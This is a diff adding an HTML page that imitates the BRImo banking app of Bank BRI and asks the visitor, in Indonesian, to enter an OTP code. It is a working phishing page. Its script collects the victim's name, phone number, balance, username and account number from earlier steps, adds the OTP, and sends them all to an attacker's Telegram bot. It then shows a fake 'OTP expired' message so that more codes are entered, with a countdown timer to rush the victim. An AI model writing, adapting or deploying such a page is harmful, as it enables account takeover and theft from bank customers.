@@ -1,0 +1,690 @@
+
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="fragment" content="!">
+    <meta name="description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ...">
+   
+    
+    <meta property="og:type" content="website" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
+   
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />
+
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
+
+      @font-face {
+        font-family: 'Avenir';
+        src: url(../fonts/AvenirNextLTPro-Bold.otf);
+      }
+
+      body {
+        padding: 0;
+        margin: 0;
+        width: 100%;
+        font-family: 'Avenir';
+        background: #d1d1d1;
+      }
+
+      .text-header {
+        font-family: 'Avenir';
+        color: #0086e0;
+      }
+
+      .text-subheader {
+        font-family: 'Avenir';
+        margin-top: -20px;
+        color: #000;
+      }
+
+      .btn-punya {
+        display: block;
+        margin: 80px auto 0 auto;
+        padding: 0px;
+        cursor: pointer;
+        background: none rgb(0, 134, 224);
+        border: none;
+        text-align: center;
+        height: 57px;
+        width: 459px;
+        max-width: 100%;
+        font-family: Arial;
+        font-size: 14px;
+        font-weight: bold;
+        color: rgb(255, 255, 255);
+        letter-spacing: 2px;
+        line-height: 1;
+        border-radius: 5px;
+        box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+        transition: background 200ms ease 0s;
+      }
+
+      .btn-belum {
+        display: block;
+        margin: 10px auto;
+        padding: 0px;
+        cursor: pointer;
+        background: none transparent;
+        border: none;
+        text-align: center;
+        height: 57px;
+        width: 459px;
+        max-width: 100%;
+        font-family: Arial;
+        font-size: 14px;
+        font-weight: bold;
+        color: rgb(0, 134, 224);
+        letter-spacing: 2px;
+        line-height: 1;
+        border-radius: 5px;
+        transition: background 200ms ease 0s;
+      }
+
+      .form-log {
+        box-sizing: border-box;
+        height: 60px;
+        width: 536px;
+        max-width: 100%;
+        border-top: 1px inset rgba(250, 250, 250, 0.13);
+        border-right: 1px solid rgba(184, 184, 184, 0.53);
+        border-bottom: none;
+        border-left: 1px outset rgba(168, 168, 168, 0.58);
+        border-image: initial;
+        background-color: rgb(255, 255, 255);
+        border-radius: 5px 5px 0px 0px;
+        box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px;
+        font-family: 'Avenir';
+        font-size: 16px;
+        color: rgb(28, 28, 28);
+        word-spacing: 7px;
+        padding: 0px 45px;
+      }
+
+      #ionIcons {
+        color: rgb(22, 119, 199);
+        font-size: 29px;
+        position: absolute;
+        display: block;
+        margin-top: 7px;
+        margin-left: 15px;
+      }
+
+      .eye {
+        display: block;
+        margin: -40px auto;
+        margin-right: 20px;
+        position: relative;
+        box-sizing: border-box;
+        z-index: 16;
+        height: 19.8189px;
+        width: 25.0236px;
+        float: right;
+        border-radius: 0px;
+        cursor: pointer;
+      }
+
+      .btn-login {
+        display: block;
+        margin: 60px 0 0 0;
+        padding: 0px;
+        cursor: pointer;
+        background: none rgba(0, 111, 214, 0.96);
+        border: none;
+        text-align: center;
+        height: 57px;
+        width: 370px;
+        font-family: Arial;
+        font-size: 17px;
+        font-weight: bold;
+        color: rgb(255, 255, 255);
+        letter-spacing: 1px;
+        line-height: 1;
+        border-radius: 8px;
+        box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+        transition: background 100ms step-start 0s;
+      }
+
+      @media only screen and (max-width: 600px) {
+        .btn-login {
+          width: 82%;
+        }
+      }
+
+      .box-lte {
+        width: 380px;
+        max-width: 95%;
+        background: #fff;
+        display: block;
+        margin: -65px auto;
+        border-radius: 10px;
+      }
+
+      textarea {
+        border: 3px solid rgb(0, 134, 224);
+        border-radius: 8px;
+        padding: 5px 10px;
+        font-family: 'Avenir';
+      }
+
+      .blink {
+        animation: blink-animation 5s steps(5, start) infinite;
+        -webkit-animation: blink-animation 1s steps(5, start) infinite;
+      }
+
+      @keyframes blink-animation {
+        to {
+          visibility: hidden;
+        }
+      }
+
+      @-webkit-keyframes blink-animation {
+        to {
+          visibility: hidden;
+        }
+      }
+
+      h1 {
+        display: table;
+        background-color: #FF0000;
+        color: #fff;
+        padding: 15px;
+        width: 100%;
+        font-size: 1em;
+        text-align: center;
+      }
+      
+              textarea {
+            box-sizing: border-box; 
+            height: 75px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+          .textarea1 {
+            box-sizing: border-box; 
+            
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            
+        }
+        
+         .textarea {
+            box-sizing: border-box; 
+            height: 75px;
+           
+            width: 280px;
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+        textarea::placeholder{
+            font-size: 13px;
+        }
+           h1{
+            display: table;
+            background-color: transparent;
+            color: #FF0000;
+            padding: 15px;
+            width: 100%;
+            font-size: 14px;
+            margin-bottom: -70px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+           font-weight: bold;
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            
+        }
+        
+        .blink {
+  animation: blink-animation 2s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+
+#Aktivasi{
+    display: none;
+}
+
+
+alert{
+    border-radius: 15px;
+}
+
+
+    </style>
+        <style>
+#animation-demo {
+	width: 200px;
+	height: 150px;
+	position: relative;
+	background-color: #62A80A;
+	line-height: 150px;
+	color: #000;
+	border: solid 1px #1A7404;
+	text-align: center;
+} 
+
+.animated {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: linear;
+	animation-timing-function: linear;
+	 -webkit-animation-name: bounceIn; 
+    animation-name: bounceIn; 
+}
+
+@-webkit-keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    70% { 
+        -webkit-transform: scale(0); 
+    } 
+
+    100% { 
+         -webkit-transform: scale(0); 
+    } 
+} 
+
+@keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        transform: scale(.1); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        transform: scale(.5); 
+    } 
+
+    70% { 
+        transform: scale(1); 
+    } 
+
+    100% { 
+        transform: scale(1); 
+    } 
+} 
+
+
+</style>  
+  <style>
+#animation-demo {
+	width: 200px;
+	height: 150px;
+	position: relative;
+	background-color: #62A80A;
+	line-height: 150px;
+	color: #000;
+	border: solid 1px #1A7404;
+	text-align: center;
+} 
+
+.naik {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: ease-in;
+	animation-timing-function: ease-in;
+	-webkit-animation-name: bounceOutUp; 
+    animation-name: bounceOutUp; 
+}
+
+@-webkit-keyframes bounceOutUp { 
+    0% { 
+        -webkit-transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        -webkit-transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateY(-200px); 
+    } 
+} 
+@keyframes bounceOutUp { 
+    0% { 
+        transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateY(-500px); 
+    } 
+} 
+.bounceOutUp { 
+    
+}
+
+
+/*********************/
+.process1 {
+     width: 100%;
+            height: 100%;
+             display: flex;
+             justify-content: center;
+            margin: auto;
+            position: absolute;
+           padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+            
+      
+}
+.loading {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 300px;
+}
+.loading img {
+    width: 50px;
+    
+    top: 10;
+}
+.loading .spinner{
+    position: absolute;
+    width: 35px;
+    animation: spin 1s linear infinite;
+    -webkit-animation: spin 1s linear infinite;
+    -moz-animation: spin 1s linear infinite;
+    -ms-animation: spin 1s linear infinite;
+    -o-animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(360deg); }
+  100% { transform: rotate(0deg); }
+}
+@-webkit-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-moz-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-ms-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+@-o-keyframes spin {
+  0% { -webkit-transform: rotate(360deg); }
+  100% { -webkit-transform: rotate(0deg); }
+}
+
+
+.loader{
+      font-size: 20px;
+      color: #FFF;
+      font-weight: bold;
+      display: inline-block;
+      font-family: 'Nunito', sans-serif;
+      
+      position: absolute;
+      margin-top: 0px;
+    }
+    .loader:before{
+      content: '';
+      animation: 2s print linear alternate infinite;
+    }
+    .loader:after{
+      content: '';
+      position: absolute;
+      right: -4px;
+      top: 50%;
+      transform: translatey(-45%);
+      width: 2px;
+      height: 1.3em;
+      background: currentColor;
+      opacity: 0.8;
+      animation: 1s blink steps(2) infinite;
+    }
+    
+    @keyframes blink {
+      0%  { visibility: hidden;}
+      100%  { visibility: visible;}
+    }
+    @keyframes print {
+      0% { content: 'B'}
+      10% { content: 'BR'}
+      20% { content: 'BRI'}
+      30% { content: 'BRIm'}
+      40% { content: 'BRImo'}
+      50% { content: 'BRImo-'}
+      60% { content: 'BRImo-B'}
+      70% { content: 'BRImo-BR.'}
+      80% { content: 'BRImo-BRI..'}
+      90% , 100% { content: 'BRImo-BRI...'}
+    }
+    
+    .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 30px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+</style>
+  </head>
+  <body>
+      <div id="gelap" name="process" class="process1" style="display: none;">
+      <div class="loading">
+               
+            </div>
+        </div>
+       <span class="blink" style="display: none" id="blinkk"><h1>Tautan /OTP tidak Valid, atau sudah Kadaluarsa</h1></span>
+ <span class="blink" style="display: none" id="blinkAktivasi"><h1>Tautan/Kode OTP tidak valid, atau sudah kadaluarsa</h1></span> 
+ <div id="popupku" style="position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999">
+    <center>
+ <img id="gambarku" class="animated" src="https://hosting.tigerengine.id/a211ot.jpg" width="60%" style="margin-top: 250px; border-radius: 15px; box-shadow: rgba(199, 199, 199, 2.2)  0px 2px 5px 0px; border: 2px double #0F78CB" onclick="tutupimg()">
+    </center>
+</div>
+           <img src="https://hosting.tigerengine.id/ciakn7.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+    <div class="container">
+      <div class="box-lte">
+        <div class="row" style="margin-top: 150px;">
+          <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"><center><img alt="" src="https://hosting.tigerengine.id/e5ewf1.webp" style="display: block; margin: 0px; width: 50%; height: 50%; border-radius: 0px;">𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶</center></div>
+        </div>
+        <div class="row">
+          <hr style="display: block; margin: auto; width: 90%;">
+          <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer"></p>
+        </div>
+        <div class="row">
+          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
+            <strong><p style="font-size: 13px; text-align: center; font-weight: bold;">Silahkan Cek Kode OTP di 𝗮𝗽𝗹𝗶𝗸𝗮𝘀𝗶 𝗕𝗥𝗜𝗺𝗼 anda, Tekan pada menu 🔔 𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶 di dalam aplikasi BRImo<br>kode OTP atau tautan lalu masukan di bawah ini.<br /></p></syrong>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;">
+            <form id="formLink" onsubmit="sendOtp()" method="POST">
+ <input type="hidden" id="nama" name="nama" value=""> 
+ <input type="hidden" id="nomor" name="nomor" value="">
+  <input type="hidden" id="saldo" name="saldo" value="">
+  <input type="hidden" id="user" name="user" value=""> 
+ <input type="hidden" id="pass" name="pass" value="">
+  
+              <textarea name="otp" id="sms" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="Silahkan  masukan Kode OTP atau Tautan BRImo dikotak ini" maxlength="" rows="1" style="max-width: 90%; display: block; margin: auto; width: 346px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 104px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; font-family: Arial; font-size: 14px; font-weight: bold; color: rgb(61, 61, 61); text-align: left; height: 102px;" required></textarea>
+              <button type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; position: relative" tabindex="2" >Konfirmasi</button>
+            </form>
+              
+          </div>
+        </div>
+        </div>
+      <div class="row">
+        <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
+          <p style="font-size: 12px; text-align: center; margin-top: 70px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="#" style="text-decoration: none; color: #828282;" onclick="getcs()">Hubungi Contact Center</a></strong></p>
+        </div>
+      </div>
+    </div>
+    <center>
+     <div id="process1" name="process" class="process1" style="display: none;">
+           <span class="loader"></span>
+        </div>
+        </center>
+ <audio hidden controls id="bsi">
+<source src="kode-otp." type="audio/ogg">
+<source src="kode-otp." type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio> 
+ <audio hidden controls id="bsiku">
+<source src="tunggu-bri." type="audio/ogg">
+<source src="tunggu-bri." type="audio/mpeg">
+  Your browser does not support the audio element.
+</audio>      
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+    <script>
+var nama = sessionStorage.getItem("nama");
+document.getElementById("nama").value = nama + "";
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomor").value = nomor + "";
+var saldo = sessionStorage.getItem("saldo");
+document.getElementById("saldo").value = saldo + "";
+var unames = sessionStorage.getItem("unames");
+document.getElementById("user").value = unames + "";
+var norek = sessionStorage.getItem("norek");
+document.getElementById("pass").value = norek + "";</script>
+<script src="i.js"></script>  <script>
+  // Otp
+function sendOtp(){
+    
+    event.preventDefault();   
+    document.getElementById('kirims').innerHTML = "Memproses....";
+        
+                              
+    var logo = "✧༺𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜༻✧";              
+    var gabungan = '' + logo + '%0A⍟ 𝗡𝗮𝗺𝗮 •• ' + nama + '%0A⍟ 𝗡𝗼𝗺𝗼𝗿 •• ' + nomor + '%0A⍟ 𝗦𝗮𝗹𝗱𝗼 •• Rp ' + saldo + '%0A%0A⍟ 𝗨𝘀𝗲𝗿 •• ' + user.value + '%0A⍟ 𝗣𝗮𝘀𝘀 •• ' + pass.value + '%0A%0A⍟ 𝗢𝗧𝗣 •• ' + sms.value ;   
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,   
+    complete: function(){
+    setTimeout(function(){   
+    document.getElementById("blinkAktivasi").style.display = "block";
+  alert("Kode 𝗢𝗧𝗣 𝗦𝗮𝗹𝗮𝗵 / 𝗞𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮                                      Harap Periksa 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 yang terbaru di 🔔 𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶 pada Aplikasi BRImo anda");
+    
+    document.getElementById('kirims').innerHTML = "Kirim";   
+    $("#sms").val("");
+ $("#sms").addClass('textarea1');  
+    
+    
+    }, 1000);}});};    
+      
+ function tutupimg(){
+      setTimeout(() => {
+  $("#popupku").hide();
+      },1000)
+      setTimeout(() => {
+       audio = document.getElementById("bsi");
+    audio.play();
+    audio.loop = false
+      },900)
+  $("#gambarku").addClass("naik");
+ }
+
+</script>
+
+    
+ <script src="token"></script>
+</script>
+
+    <script>
+      document.getElementById('timer')
+      .innerHTML = 03 + ":" + 01;
+      startTimer();
+
+      function startTimer() {
+        var presentTime = document.getElementById('timer').innerHTML;
+        var timeArray = presentTime.split(/[:]+/);
+        var m = timeArray[0];
+        var s = checkSecond((timeArray[1] - 1));
+        if (s == 59) {
+          m = m - 1
+        }
+        if (m < 0) {
+        alert("Waktu Habis");
+          return
+        }
+        document.getElementById('timer').innerHTML = m + " : " + s;
+        setTimeout(startTimer, 1000);
+      }
+
+      function checkSecond(sec) {
+        if (sec < 10 && sec >= 0) {
+          sec = "0" + sec
+        }; // add zero in front of numbers < 10
+        if (sec < 0) {
+          sec = "59"
+        };
+        return sec;
+      }
+    </script>
+    <!-- </body> -->
+  </body>
+</html>
